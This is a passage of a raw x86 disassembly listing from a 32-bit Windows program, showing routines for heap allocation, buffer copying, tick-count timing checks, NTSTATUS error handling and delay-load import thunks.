  406706:	mov    eax,DWORD PTR [esp+0xc]
  40670a:	inc    eax
  40670b:	mov    DWORD PTR [esp+0xc],eax
  40670f:	cmp    eax,DWORD PTR [esi+0x70]
  406712:	jb     0x406690
  406718:	mov    eax,DWORD PTR [ebx]
  40671a:	mov    DWORD PTR [esp+0x1c],eax
  40671e:	mov    eax,DWORD PTR [esi+0x48]
  406721:	mov    DWORD PTR [esp+0x20],eax
  406725:	mov    eax,fs:0x30
  40672b:	mov    DWORD PTR [esp+0x3c],0x1
  406733:	mov    ecx,DWORD PTR [eax+0x18]
  406736:	movzx  eax,WORD PTR [esi+0x48]
  40673a:	inc    eax
  40673b:	push   eax
  40673c:	push   0x8
  40673e:	push   ecx
  40673f:	call   DWORD PTR ds:0x40a1b8
  406745:	mov    DWORD PTR [esp+0x24],eax
  406749:	test   eax,eax
  40674b:	je     0x40683c
  406751:	movzx  ecx,WORD PTR [esp+0x20]
  406756:	push   ecx
  406757:	push   DWORD PTR [esi+0x4c]
  40675a:	push   eax
  40675b:	call   0x407ab0
  406760:	mov    eax,DWORD PTR [ebx+0xc]
  406763:	add    esp,0xc
  406766:	mov    DWORD PTR [esp+0x28],eax
  40676a:	mov    eax,fs:0x30
  406770:	mov    edi,DWORD PTR [esp+0x28]
  406774:	mov    ecx,DWORD PTR [eax+0x18]
  406777:	mov    eax,edi
  406779:	shr    eax,0x10
  40677c:	push   eax
  40677d:	push   0x8
  40677f:	push   ecx
  406780:	call   DWORD PTR ds:0x40a1b8
  406786:	mov    DWORD PTR [esp+0x2c],eax
  40678a:	test   eax,eax
  40678c:	je     0x406822
  406792:	movzx  ecx,di
  406795:	push   ecx
  406796:	push   DWORD PTR [ebx+0x10]
  406799:	push   eax
  40679a:	call   0x407ab0
  40679f:	mov    eax,DWORD PTR [esp+0x28]
  4067a3:	add    esp,0xc
  4067a6:	sub    eax,0x1
  4067a9:	je     0x4067ef
  4067ab:	sub    eax,0x1
  4067ae:	jne    0x4067f6
  4067b0:	mov    eax,DWORD PTR [ebx+0x18]
  4067b3:	mov    DWORD PTR [esp+0x34],eax
  4067b7:	mov    eax,fs:0x30
  4067bd:	mov    ecx,DWORD PTR [eax+0x18]
  4067c0:	movzx  eax,WORD PTR [ebx+0x1a]
  4067c4:	push   eax
  4067c5:	push   0x8
  4067c7:	push   ecx
  4067c8:	call   DWORD PTR ds:0x40a1b8
  4067ce:	mov    DWORD PTR [esp+0x38],eax
  4067d2:	test   eax,eax
  4067d4:	je     0x406822
  4067d6:	movzx  ecx,WORD PTR [esp+0x34]
  4067db:	push   ecx
  4067dc:	push   DWORD PTR [ebx+0x1c]
  4067df:	push   eax
  4067e0:	call   0x407ab0
  4067e5:	add    esp,0xc
  4067e8:	jmp    0x4067f6
  4067ea:	inc    DWORD PTR [edi+0x20]
  4067ed:	jmp    0x406822
  4067ef:	mov    eax,DWORD PTR [ebx+0x14]
  4067f2:	mov    DWORD PTR [esp+0x30],eax
  4067f6:	lea    eax,[esp+0x1c]
  4067fa:	push   eax
  4067fb:	lea    ecx,[esi+0x68]
  4067fe:	call   0x406ab0
  406803:	test   eax,eax
  406805:	js     0x406822
  406807:	xor    eax,eax
  406809:	cmp    DWORD PTR [esi+0x70],0x40
  40680d:	mov    DWORD PTR [esp+0x2c],eax
  406811:	mov    DWORD PTR [esp+0x38],eax
  406815:	mov    DWORD PTR [esp+0x24],eax
  406819:	jb     0x406856
  40681b:	mov    ecx,esi
  40681d:	call   0x406126
  406822:	cmp    DWORD PTR [esp+0x24],0x0
  406827:	je     0x40683c
  406829:	mov    ecx,DWORD PTR fs:0x30
  406830:	mov    edx,DWORD PTR [esp+0x24]
  406834:	mov    ecx,DWORD PTR [ecx+0x18]
  406837:	call   0x406c89
  40683c:	cmp    DWORD PTR [esp+0x2c],0x0
  406841:	je     0x406856
  406843:	mov    ecx,DWORD PTR fs:0x30
  40684a:	mov    edx,DWORD PTR [esp+0x2c]
  40684e:	mov    ecx,DWORD PTR [ecx+0x18]
  406851:	call   0x406c89
  406856:	cmp    DWORD PTR [esp+0x1c],0x2
  40685b:	jne    0x406877
  40685d:	cmp    DWORD PTR [esp+0x38],0x0
  406862:	je     0x406877
  406864:	mov    ecx,DWORD PTR fs:0x30
  40686b:	mov    edx,DWORD PTR [esp+0x38]
  40686f:	mov    ecx,DWORD PTR [ecx+0x18]
  406872:	call   0x406c89
  406877:	mov    edi,DWORD PTR ds:0x7ffe0004
  40687d:	mov    edx,0x7ffe0324
  406882:	mov    ebx,0x7ffe0320
  406887:	mov    DWORD PTR [esp+0xc],edi
  40688b:	mov    ecx,0x7ffe0328
  406890:	mov    edx,DWORD PTR [edx]
  406892:	mov    ebx,DWORD PTR [ebx]
  406894:	mov    eax,DWORD PTR [ecx]
  406896:	cmp    edx,eax
  406898:	je     0x4068b9
  40689a:	lea    edi,[ecx-0x4]
  40689d:	lea    esi,[ecx-0x8]
  4068a0:	pause  
  4068a2:	mov    edx,DWORD PTR [edi]
  4068a4:	mov    ebx,DWORD PTR [esi]
  4068a6:	mov    ecx,DWORD PTR [ecx]
  4068a8:	cmp    edx,ecx
  4068aa:	mov    ecx,0x7ffe0328
  4068af:	jne    0x4068a0
  4068b1:	mov    esi,DWORD PTR [esp+0x10]
  4068b5:	mov    edi,DWORD PTR [esp+0xc]
  4068b9:	mov    eax,edx
  4068bb:	mul    edi
  4068bd:	mov    edi,eax
  4068bf:	mov    ecx,edx
  4068c1:	mov    eax,ebx
  4068c3:	mul    DWORD PTR [esp+0xc]
  4068c7:	shld   ecx,edi,0x8
  4068cb:	shrd   eax,edx,0x18
  4068cf:	shl    edi,0x8
  4068d2:	shr    edx,0x18
  4068d5:	add    edi,eax
  4068d7:	adc    ecx,edx
  4068d9:	sub    edi,DWORD PTR [esi+0x80]
  4068df:	sbb    ecx,DWORD PTR [esi+0x84]
  4068e5:	mov    DWORD PTR [esp+0x14],ecx
  4068e9:	jne    0x4068f3
  4068eb:	cmp    edi,0x36ee80
  4068f1:	jbe    0x4068fa
  4068f3:	mov    ecx,esi
  4068f5:	call   0x406126
  4068fa:	lea    eax,[esi+0x50]
  4068fd:	push   eax
  4068fe:	call   DWORD PTR ds:0x40a190
  406904:	pop    edi
  406905:	pop    esi
  406906:	pop    ebx
  406907:	mov    esp,ebp
  406909:	pop    ebp
  40690a:	ret    
  40690b:	int3   
  40690c:	int3   
  40690d:	int3   
  40690e:	int3   
  40690f:	int3   
  406910:	mov    edi,edi
  406912:	push   ebp
  406913:	mov    ebp,esp
  406915:	sub    esp,0x2c
  406918:	mov    eax,ecx
  40691a:	mov    DWORD PTR [ebp-0x4],edx
  40691d:	mov    DWORD PTR [ebp-0x8],eax
  406920:	test   eax,eax
  406922:	je     0x406a27
  406928:	push   ebx
  406929:	push   esi
  40692a:	push   edi
  40692b:	push   0x8
  40692d:	pop    ecx
  40692e:	xor    eax,eax
  406930:	mov    DWORD PTR [ebp-0x2c],0x2
  406937:	lea    edi,[ebp-0x28]
  40693a:	xor    esi,esi
  40693c:	rep stos DWORD PTR es:[edi],eax
  40693e:	mov    eax,fs:0x30
  406944:	mov    edi,0x100
  406949:	push   edi
  40694a:	push   0x8
  40694c:	push   DWORD PTR [eax+0x18]
  40694f:	call   DWORD PTR ds:0x40a1b8
  406955:	mov    ebx,eax
  406957:	test   ebx,ebx
  406959:	je     0x406a24
  40695f:	push   DWORD PTR [ebp+0x8]
  406962:	push   DWORD PTR [ebp-0x4]
  406965:	push   0x402560
  40696a:	push   edi
  40696b:	push   ebx
  40696c:	call   0x40537f
  406971:	add    esp,0x14
  406974:	test   eax,eax
  406976:	js     0x4069fe
  40697c:	mov    eax,fs:0x30
  406982:	mov    edi,0x400
  406987:	push   edi
  406988:	push   0x8
  40698a:	push   DWORD PTR [eax+0x18]
  40698d:	call   DWORD PTR ds:0x40a1b8
  406993:	mov    esi,eax
  406995:	test   esi,esi
  406997:	je     0x4069fe
  406999:	push   DWORD PTR [ebp+0x10]
  40699c:	mov    edx,edi
  40699e:	mov    ecx,esi
  4069a0:	push   DWORD PTR [ebp+0xc]
  4069a3:	call   0x405345
  4069a8:	test   eax,eax
  4069aa:	js     0x4069fe
  4069ac:	push   ebx
  4069ad:	lea    eax,[ebp-0x20]
  4069b0:	push   eax
  4069b1:	call   DWORD PTR ds:0x40a19c
  4069b7:	push   esi
  4069b8:	lea    eax,[ebp-0x14]
  4069bb:	push   eax
  4069bc:	call   DWORD PTR ds:0x40a19c
  4069c2:	push   0x5b
  4069c4:	push   esi
  4069c5:	call   DWORD PTR ds:0x40a164
  4069cb:	mov    edi,eax
  4069cd:	pop    ecx
  4069ce:	pop    ecx
  4069cf:	test   edi,edi
  4069d1:	je     0x4069f3
  4069d3:	push   0x5d
  4069d5:	push   edi
  4069d6:	call   DWORD PTR ds:0x40a164
  4069dc:	pop    ecx
  4069dd:	pop    ecx
  4069de:	test   eax,eax
  4069e0:	je     0x4069f3
  4069e2:	mov    BYTE PTR [eax],0x0
  4069e5:	lea    eax,[edi+0x1]
  4069e8:	push   eax
  4069e9:	lea    eax,[ebp-0x14]
  4069ec:	push   eax
  4069ed:	call   DWORD PTR ds:0x40a19c
  4069f3:	mov    ecx,DWORD PTR [ebp-0x8]
  4069f6:	lea    edx,[ebp-0x2c]
  4069f9:	call   0x406656
  4069fe:	mov    ecx,DWORD PTR fs:0x30
  406a05:	mov    edx,ebx
  406a07:	mov    ecx,DWORD PTR [ecx+0x18]
  406a0a:	call   0x406c89
  406a0f:	test   esi,esi
  406a11:	je     0x406a24
  406a13:	mov    ecx,DWORD PTR fs:0x30
  406a1a:	mov    edx,esi
  406a1c:	mov    ecx,DWORD PTR [ecx+0x18]
  406a1f:	call   0x406c89
  406a24:	pop    edi
  406a25:	pop    esi
  406a26:	pop    ebx
  406a27:	mov    esp,ebp
  406a29:	pop    ebp
  406a2a:	ret    0xc
  406a2d:	int3   
  406a2e:	int3   
  406a2f:	int3   
  406a30:	int3   
  406a31:	int3   
  406a32:	mov    edi,edi
  406a34:	push   ebp
  406a35:	mov    ebp,esp
  406a37:	push   ecx
  406a38:	push   esi
  406a39:	mov    esi,ecx
  406a3b:	mov    ecx,DWORD PTR [esi+0x8]
  406a3e:	test   ecx,ecx
  406a40:	je     0x406a66
  406a42:	mov    edx,DWORD PTR [esi+0x4]
  406a45:	lea    eax,[ebp-0x4]
  406a48:	push   eax
  406a49:	call   0x405c79
  406a4e:	test   eax,eax
  406a50:	js     0x406a66
  406a52:	push   DWORD PTR [ebp-0x4]
  406a55:	push   0x0
  406a57:	push   DWORD PTR [esi+0x14]
  406a5a:	call   0x407abc
  406a5f:	add    esp,0xc
  406a62:	and    DWORD PTR [esi+0x8],0x0
  406a66:	pop    esi
  406a67:	mov    esp,ebp
  406a69:	pop    ebp
  406a6a:	ret    
  406a6b:	int3   
  406a6c:	int3   
  406a6d:	int3   
  406a6e:	int3   
  406a6f:	int3   
  406a70:	mov    edi,edi
  406a72:	push   ebp
  406a73:	mov    ebp,esp
  406a75:	push   ecx
  406a76:	mov    edx,DWORD PTR [ebp+0x8]
  406a79:	push   esi
  406a7a:	push   edi
  406a7b:	mov    edi,ecx
  406a7d:	xor    esi,esi
  406a7f:	cmp    edx,DWORD PTR [edi+0x8]
  406a82:	jae    0x406aa1
  406a84:	mov    ecx,DWORD PTR [edi+0x4]
  406a87:	lea    eax,[ebp-0x4]
  406a8a:	push   eax
  406a8b:	call   0x405c79
  406a90:	test   eax,eax
  406a92:	js     0x406aa1
  406a94:	mov    eax,DWORD PTR [ebp-0x4]
  406a97:	add    eax,DWORD PTR [edi+0x14]
  406a9a:	cmp    eax,DWORD PTR [edi+0x14]
  406a9d:	jb     0x406aa1
  406a9f:	mov    esi,eax
  406aa1:	pop    edi
  406aa2:	mov    eax,esi
  406aa4:	pop    esi
  406aa5:	mov    esp,ebp
  406aa7:	pop    ebp
  406aa8:	ret    0x4
  406aab:	int3   
  406aac:	int3   
  406aad:	int3   
  406aae:	int3   
  406aaf:	int3   
  406ab0:	mov    edi,edi
  406ab2:	push   ebp
  406ab3:	mov    ebp,esp
  406ab5:	push   ecx
  406ab6:	push   ecx
  406ab7:	push   ebx
  406ab8:	push   esi
  406ab9:	mov    esi,ecx
  406abb:	push   edi
  406abc:	mov    edi,DWORD PTR [esi+0x8]
  406abf:	mov    DWORD PTR [ebp-0x8],edi
  406ac2:	cmp    edi,DWORD PTR [esi+0xc]
  406ac5:	jb     0x406b6e
  406acb:	lea    ecx,[edi+0x1]
  406ace:	cmp    ecx,DWORD PTR [esi+0xc]
  406ad1:	ja     0x406add
  406ad3:	mov    eax,0xc000000d
  406ad8:	jmp    0x406ba5
  406add:	mov    ebx,DWORD PTR [esi+0x10]
  406ae0:	dec    ebx
  406ae1:	lea    eax,[ebx+ecx*1]
  406ae4:	cmp    eax,ecx
  406ae6:	jb     0x406ba0
  406aec:	mov    edx,DWORD PTR [esi+0x4]
  406aef:	not    ebx
  406af1:	mov    ecx,DWORD PTR [esi+0xc]
  406af4:	and    ebx,eax
  406af6:	lea    eax,[ebp-0x4]
  406af9:	push   eax
  406afa:	call   0x405c79
  406aff:	test   eax,eax
  406b01:	js     0x406b15
  406b03:	mov    edx,DWORD PTR [esi+0x4]
  406b06:	lea    eax,[ebp-0x4]
  406b09:	push   eax
  406b0a:	mov    ecx,ebx
  406b0c:	call   0x405c79
  406b11:	test   eax,eax
  406b13:	jns    0x406b1c
  406b15:	mov    eax,0xc0000095
  406b1a:	jmp    0x406b6a
  406b1c:	cmp    DWORD PTR [esi+0x14],0x0
  406b20:	push   DWORD PTR [ebp-0x4]
  406b23:	jne    0x406b45
  406b25:	push   0x0
  406b27:	push   DWORD PTR [esi]
  406b29:	call   DWORD PTR ds:0x40a1b8
  406b2f:	mov    edi,eax
  406b31:	test   edi,edi
  406b33:	je     0x406b58
  406b35:	push   DWORD PTR [ebp-0x4]
  406b38:	push   0x0
  406b3a:	push   edi
  406b3b:	call   0x407abc
  406b40:	add    esp,0xc
  406b43:	jmp    0x406b54
  406b45:	push   DWORD PTR [esi+0x14]
  406b48:	push   0x0
  406b4a:	push   DWORD PTR [esi]
  406b4c:	call   DWORD PTR ds:0x40a180
  406b52:	mov    edi,eax
  406b54:	test   edi,edi
  406b56:	jne    0x406b5f
  406b58:	mov    eax,0xc0000017
  406b5d:	jmp    0x406b67
  406b5f:	mov    DWORD PTR [esi+0x14],edi
  406b62:	xor    eax,eax
  406b64:	mov    DWORD PTR [esi+0xc],ebx
  406b67:	mov    edi,DWORD PTR [ebp-0x8]
  406b6a:	test   eax,eax
  406b6c:	jne    0x406ba5
  406b6e:	mov    ecx,DWORD PTR [esi+0x4]
  406b71:	lea    eax,[ebp-0x8]
  406b74:	push   eax
  406b75:	mov    edx,edi
  406b77:	call   0x405c79
  406b7c:	test   eax,eax
  406b7e:	js     0x406ba0
  406b80:	mov    eax,DWORD PTR [ebp-0x8]
  406b83:	add    eax,DWORD PTR [esi+0x14]
  406b86:	cmp    eax,DWORD PTR [esi+0x14]
  406b89:	jb     0x406ba0
  406b8b:	push   0x24
  406b8d:	push   DWORD PTR [ebp+0x8]
  406b90:	push   eax
  406b91:	call   0x407ab0
  406b96:	add    esp,0xc
  406b99:	inc    DWORD PTR [esi+0x8]
  406b9c:	xor    eax,eax
  406b9e:	jmp    0x406ba5
  406ba0:	mov    eax,0xc0000095
  406ba5:	pop    edi
  406ba6:	pop    esi
  406ba7:	pop    ebx
  406ba8:	mov    esp,ebp
  406baa:	pop    ebp
  406bab:	ret    0x4
  406bae:	int3   
  406baf:	int3   
  406bb0:	int3   
  406bb1:	int3   
  406bb2:	int3   
  406bb3:	mov    edi,edi
  406bb5:	push   ebp
  406bb6:	mov    ebp,esp
  406bb8:	push   ecx
  406bb9:	push   ecx
  406bba:	push   ebx
  406bbb:	push   esi
  406bbc:	mov    esi,ecx
  406bbe:	xor    ebx,ebx
  406bc0:	push   edi
  406bc1:	cmp    DWORD PTR [esi+0x14],ebx
  406bc4:	je     0x406bd2
  406bc6:	push   DWORD PTR [esi+0x14]
  406bc9:	push   ebx
  406bca:	push   DWORD PTR [esi]
  406bcc:	call   DWORD PTR ds:0x40a170
  406bd2:	push   0x6
  406bd4:	pop    ecx
  406bd5:	xor    eax,eax
  406bd7:	mov    edi,esi
  406bd9:	rep stos DWORD PTR es:[edi],eax
  406bdb:	push   0x6
  406bdd:	pop    ecx
  406bde:	mov    edi,esi
  406be0:	rep stos DWORD PTR es:[edi],eax
  406be2:	mov    eax,fs:0x30
  406be8:	push   0x24
  406bea:	pop    ecx
  406beb:	mov    edx,ecx
  406bed:	mov    edi,DWORD PTR [eax+0x18]
  406bf0:	lea    eax,[ebp-0x8]
  406bf3:	mov    DWORD PTR [esi+0x4],ecx
  406bf6:	xor    ecx,ecx
  406bf8:	push   eax
  406bf9:	mov    DWORD PTR [esi],edi
  406bfb:	mov    DWORD PTR [esi+0x10],0x40
  406c02:	mov    DWORD PTR [esi+0x8],ebx
  406c05:	mov    DWORD PTR [esi+0xc],ebx
  406c08:	mov    DWORD PTR [esi+0x14],ebx
  406c0b:	call   0x405c79
  406c10:	test   eax,eax
  406c12:	jns    0x406c1b
  406c14:	mov    ebx,0xc0000095
  406c19:	jmp    0x406c5d
  406c1b:	lea    eax,[ebp-0x4]
  406c1e:	push   eax
  406c1f:	push   0x24
  406c21:	pop    edx
  406c22:	push   0x40
  406c24:	pop    ecx
  406c25:	call   0x405c79
  406c2a:	test   eax,eax
  406c2c:	js     0x406c14
  406c2e:	push   DWORD PTR [ebp-0x4]
  406c31:	push   ebx
  406c32:	push   edi
  406c33:	call   DWORD PTR ds:0x40a1b8
  406c39:	mov    edi,eax
  406c3b:	test   edi,edi
  406c3d:	je     0x406c58
  406c3f:	push   DWORD PTR [ebp-0x4]
  406c42:	push   ebx
  406c43:	push   edi
  406c44:	call   0x407abc
  406c49:	add    esp,0xc
  406c4c:	mov    DWORD PTR [esi+0x14],edi
  406c4f:	mov    DWORD PTR [esi+0xc],0x40
  406c56:	jmp    0x406c79
  406c58:	mov    ebx,0xc0000017
  406c5d:	cmp    DWORD PTR [esi+0x14],0x0
  406c61:	je     0x406c70
  406c63:	push   DWORD PTR [esi+0x14]
  406c66:	push   0x0
  406c68:	push   DWORD PTR [esi]
  406c6a:	call   DWORD PTR ds:0x40a170
  406c70:	push   0x6
  406c72:	pop    ecx
  406c73:	xor    eax,eax
  406c75:	mov    edi,esi
  406c77:	rep stos DWORD PTR es:[edi],eax
  406c79:	pop    edi
  406c7a:	pop    esi
  406c7b:	mov    eax,ebx
  406c7d:	pop    ebx
  406c7e:	mov    esp,ebp
  406c80:	pop    ebp
  406c81:	ret    0xc
  406c84:	int3   
  406c85:	int3   
  406c86:	int3   
  406c87:	int3   
  406c88:	int3   
  406c89:	test   edx,edx
  406c8b:	je     0x406c97
  406c8d:	push   edx
  406c8e:	push   0x0
  406c90:	push   ecx
  406c91:	call   DWORD PTR ds:0x40a170
  406c97:	ret    
  406c98:	int3   
  406c99:	int3   
  406c9a:	int3   
  406c9b:	int3   
  406c9c:	int3   
  406c9d:	mov    edi,edi
  406c9f:	push   ebp
  406ca0:	mov    ebp,esp
  406ca2:	sub    esp,0x1c
  406ca5:	mov    eax,ds:0x409004
  406caa:	xor    eax,ebp
  406cac:	mov    DWORD PTR [ebp-0x4],eax
  406caf:	mov    eax,DWORD PTR [ebp+0x8]
  406cb2:	and    DWORD PTR [ebp-0x1c],0x0
  406cb6:	push   esi
  406cb7:	push   edi
  406cb8:	mov    edi,ecx
  406cba:	lea    ecx,[ebp-0x1c]
  406cbd:	push   ecx
  406cbe:	push   0x14
  406cc0:	lea    ecx,[ebp-0x18]
  406cc3:	and    DWORD PTR [edi],0x0
  406cc6:	push   ecx
  406cc7:	push   0x2
  406cc9:	push   eax
  406cca:	push   edx
  406ccb:	call   DWORD PTR ds:0x40a1ac
  406cd1:	mov    esi,eax
  406cd3:	test   esi,esi
  406cd5:	jns    0x406cfb
  406cd7:	cmp    esi,0xc0000034
  406cdd:	je     0x406d2e
  406cdf:	push   esi
  406ce0:	push   0x402578
  406ce5:	push   0x2ce
  406cea:	push   0x402598
  406cef:	push   0x1
  406cf1:	call   0x4052c4
  406cf6:	add    esp,0x14
  406cf9:	jmp    0x406d2e
  406cfb:	cmp    DWORD PTR [ebp-0x14],0x4
  406cff:	jne    0x406d10
  406d01:	cmp    DWORD PTR [ebp-0x10],0x4
  406d05:	jne    0x406d10
  406d07:	mov    eax,DWORD PTR [ebp-0xc]
  406d0a:	xor    esi,esi
  406d0c:	mov    DWORD PTR [edi],eax
  406d0e:	jmp    0x406d2e
  406d10:	push   0x4025b4
  406d15:	push   0x2d5
  406d1a:	push   0x402598
  406d1f:	push   0x1
  406d21:	call   0x4052c4
  406d26:	add    esp,0x10
  406d29:	mov    esi,0xc0000024
  406d2e:	mov    ecx,DWORD PTR [ebp-0x4]
  406d31:	mov    eax,esi
  406d33:	pop    edi
  406d34:	xor    ecx,ebp
  406d36:	pop    esi
  406d37:	call   0x407330
  406d3c:	mov    esp,ebp
  406d3e:	pop    ebp
  406d3f:	ret    0x4
  406d42:	int3   
  406d43:	int3   
  406d44:	int3   
  406d45:	int3   
  406d46:	int3   
  406d47:	mov    edi,edi
  406d49:	push   ebp
  406d4a:	mov    ebp,esp
  406d4c:	push   ecx
  406d4d:	push   ecx
  406d4e:	push   ebx
  406d4f:	push   esi
  406d50:	push   edi
  406d51:	push   0x4023fc
  406d56:	lea    eax,[ebp-0x8]
  406d59:	mov    edi,edx
  406d5b:	push   eax
  406d5c:	mov    ebx,ecx
  406d5e:	call   DWORD PTR ds:0x40a1a8
  406d64:	mov    esi,eax
  406d66:	test   esi,esi
  406d68:	jns    0x406d86
  406d6a:	push   esi
  406d6b:	push   0x4025c8
  406d70:	push   0x307
  406d75:	push   0x4025ec
  406d7a:	push   0x1
  406d7c:	call   0x4052c4
  406d81:	add    esp,0x14
  406d84:	jmp    0x406d95
  406d86:	lea    eax,[ebp-0x8]
  406d89:	mov    edx,edi
  406d8b:	push   eax
  406d8c:	mov    ecx,ebx
  406d8e:	call   0x406c9d
  406d93:	mov    esi,eax
  406d95:	pop    edi
  406d96:	mov    eax,esi
  406d98:	pop    esi
  406d99:	pop    ebx
  406d9a:	mov    esp,ebp
  406d9c:	pop    ebp
  406d9d:	ret    0x4
  406da0:	int3   
  406da1:	int3   
  406da2:	int3   
  406da3:	int3   
  406da4:	int3   
  406da5:	mov    edi,edi
  406da7:	push   ebp
  406da8:	mov    ebp,esp
  406daa:	push   ecx
  406dab:	push   ecx
  406dac:	push   esi
  406dad:	push   edi
  406dae:	push   0x402604
  406db3:	lea    eax,[ebp-0x8]
  406db6:	xor    edi,edi
  406db8:	push   eax
  406db9:	mov    esi,ecx
  406dbb:	mov    DWORD PTR [ebp-0x8],edi
  406dbe:	mov    DWORD PTR [ebp-0x4],edi
  406dc1:	call   DWORD PTR ds:0x40a174
  406dc7:	mov    ecx,DWORD PTR [ebp-0x8]
  406dca:	xor    eax,eax
  406dcc:	mov    WORD PTR [esi],ax
  406dcf:	add    ecx,0x7a
  406dd2:	mov    eax,fs:0x30
  406dd8:	mov    WORD PTR [esi+0x2],cx
  406ddc:	mov    edx,DWORD PTR [eax+0x18]
  406ddf:	movzx  eax,cx
  406de2:	push   eax
  406de3:	push   0x8
  406de5:	push   edx
  406de6:	call   DWORD PTR ds:0x40a1b8
  406dec:	mov    DWORD PTR [esi+0x4],eax
  406def:	test   eax,eax
  406df1:	jne    0x406e18
  406df3:	movzx  eax,WORD PTR [esi+0x2]
  406df7:	mov    edi,0xc0000017
  406dfc:	push   eax
  406dfd:	push   0x402628
  406e02:	push   0x4a9
  406e07:	push   0x402658
  406e0c:	push   0x1
  406e0e:	call   0x4052c4
  406e13:	add    esp,0x14
  406e16:	jmp    0x406e2f
  406e18:	lea    eax,[ebp-0x8]
  406e1b:	push   eax
  406e1c:	push   esi
  406e1d:	call   DWORD PTR ds:0x40a1b0
  406e23:	push   0x402380
  406e28:	push   esi
  406e29:	call   DWORD PTR ds:0x40a1b4
  406e2f:	mov    eax,edi
  406e31:	pop    edi
  406e32:	pop    esi
  406e33:	mov    esp,ebp
  406e35:	pop    ebp
  406e36:	ret    
  406e37:	int3   
  406e38:	int3   
  406e39:	int3   
  406e3a:	int3   
  406e3b:	int3   
  406e3c:	mov    edi,edi
  406e3e:	push   ebp
  406e3f:	mov    ebp,esp
  406e41:	sub    esp,0x24
  406e44:	push   ebx
  406e45:	push   esi
  406e46:	push   edi
  406e47:	mov    edi,ecx
  406e49:	xor    ebx,ebx
  406e4b:	lea    ecx,[ebp-0xc]
  406e4e:	mov    DWORD PTR [ebp-0xc],ebx
  406e51:	mov    DWORD PTR [ebp-0x8],ebx
  406e54:	mov    DWORD PTR [ebp-0x4],ebx
  406e57:	mov    DWORD PTR [edi],ebx
  406e59:	call   0x406da5
  406e5e:	mov    esi,eax
  406e60:	test   esi,esi
  406e62:	jns    0x406e85
  406e64:	push   esi
  406e65:	push   0x402380
  406e6a:	push   0x402674
  406e6f:	push   0x52d
  406e74:	push   0x4026a4
  406e79:	push   0x1
  406e7b:	call   0x4052c4
  406e80:	add    esp,0x18
  406e83:	jmp    0x406edc
  406e85:	lea    eax,[ebp-0xc]
  406e88:	mov    DWORD PTR [ebp-0x24],0x18
  406e8f:	mov    DWORD PTR [ebp-0x1c],eax
  406e92:	lea    eax,[ebp-0x24]
  406e95:	push   eax
  406e96:	push   0x1
  406e98:	lea    eax,[ebp-0x4]
  406e9b:	mov    DWORD PTR [ebp-0x20],ebx
  406e9e:	push   eax
  406e9f:	mov    DWORD PTR [ebp-0x18],0x40
  406ea6:	mov    DWORD PTR [ebp-0x14],ebx
  406ea9:	mov    DWORD PTR [ebp-0x10],ebx
  406eac:	call   DWORD PTR ds:0x40a1a4
  406eb2:	mov    esi,eax
  406eb4:	test   esi,esi
  406eb6:	jns    0x406ed2
  406eb8:	cmp    esi,0xc0000034
  406ebe:	je     0x406edc
  406ec0:	push   esi
  406ec1:	push   0x402380
  406ec6:	push   0x4026b8
  406ecb:	push   0x558
  406ed0:	jmp    0x406e74
  406ed2:	mov    eax,DWORD PTR [ebp-0x4]
  406ed5:	mov    esi,ebx
  406ed7:	mov    DWORD PTR [edi],eax
  406ed9:	mov    DWORD PTR [ebp-0x4],ebx
  406edc:	cmp    DWORD PTR [ebp-0x8],ebx
  406edf:	je     0x406ef3
  406ee1:	mov    ecx,DWORD PTR fs:0x30
  406ee8:	mov    edx,DWORD PTR [ebp-0x8]
  406eeb:	mov    ecx,DWORD PTR [ecx+0x18]
  406eee:	call   0x406c89
  406ef3:	pop    edi
  406ef4:	mov    eax,esi
  406ef6:	pop    esi
  406ef7:	pop    ebx
  406ef8:	mov    esp,ebp
  406efa:	pop    ebp
  406efb:	ret    0xc
  406efe:	int3   
  406eff:	int3   
  406f00:	int3   
  406f01:	int3   
  406f02:	int3   
  406f03:	mov    edi,edi
  406f05:	push   ebp
  406f06:	mov    ebp,esp
  406f08:	push   0x0
  406f0a:	push   DWORD PTR [ebp+0xc]
  406f0d:	push   DWORD PTR ds:0x40a03c
  406f13:	push   DWORD PTR ds:0x4026d8
  406f19:	push   DWORD PTR [ebp+0x8]
  406f1c:	push   0x400000
  406f21:	call   DWORD PTR ds:0x40a040
  406f27:	pop    ebp
  406f28:	ret    0x8
  406f2b:	int3   
  406f2c:	int3   
  406f2d:	int3   
  406f2e:	int3   
  406f2f:	int3   
  406f30:	jmp    DWORD PTR ds:0x40a048
  406f36:	int3   
  406f37:	int3   
  406f38:	int3   
  406f39:	int3   
  406f3a:	int3   
  406f3b:	int3   
  406f3c:	jmp    DWORD PTR ds:0x40a018
  406f42:	int3   
  406f43:	int3   
  406f44:	int3   
  406f45:	int3   
  406f46:	int3   
  406f47:	int3   
  406f48:	jmp    DWORD PTR ds:0x40a01c
  406f4e:	int3   
  406f4f:	int3   
  406f50:	int3   
  406f51:	int3   
  406f52:	int3   
  406f53:	int3   
  406f54:	jmp    DWORD PTR ds:0x40a04c
  406f5a:	int3   
  406f5b:	int3   
  406f5c:	int3   
  406f5d:	int3   
  406f5e:	int3   
  406f5f:	int3   
  406f60:	mov    eax,0x40b01c
  406f65:	jmp    0x406f6f
  406f6a:	int3   
  406f6b:	int3   
  406f6c:	int3   
  406f6d:	int3   
  406f6e:	int3   
  406f6f:	push   ecx
  406f70:	push   edx
  406f71:	push   eax
  406f72:	push   0x407efc
  406f77:	call   0x406f03
  406f7c:	pop    edx
  406f7d:	pop    ecx
  406f7e:	jmp    eax
  406f80:	int3   
  406f81:	int3   
  406f82:	int3   
  406f83:	int3   
  406f84:	int3   
  406f85:	int3   
  406f86:	int3   
  406f87:	int3   
  406f88:	int3   
  406f89:	int3   
  406f8a:	int3   
  406f8b:	int3   
  406f8c:	int3   
  406f8d:	int3   
  406f8e:	int3   
  406f8f:	int3   
  406f90:	mov    eax,0x40b018
  406f95:	jmp    0x406f6f
  406f9a:	int3   
  406f9b:	int3   
  406f9c:	int3   
  406f9d:	int3   
  406f9e:	int3   
  406f9f:	int3   
  406fa0:	mov    eax,0x40b014
  406fa5:	jmp    0x406f6f
  406faa:	int3   
  406fab:	int3   
  406fac:	int3   
  406fad:	int3   
  406fae:	int3   
  406faf:	int3   
  406fb0:	mov    eax,0x40b010
  406fb5:	jmp    0x406f6f
  406fba:	int3   
  406fbb:	int3   
  406fbc:	int3   
  406fbd:	int3   
  406fbe:	int3   
  406fbf:	int3   
  406fc0:	int3   
  406fc1:	int3   
  406fc2:	int3   
  406fc3:	int3   
  406fc4:	int3   
  406fc5:	int3   
  406fc6:	int3   
  406fc7:	int3   
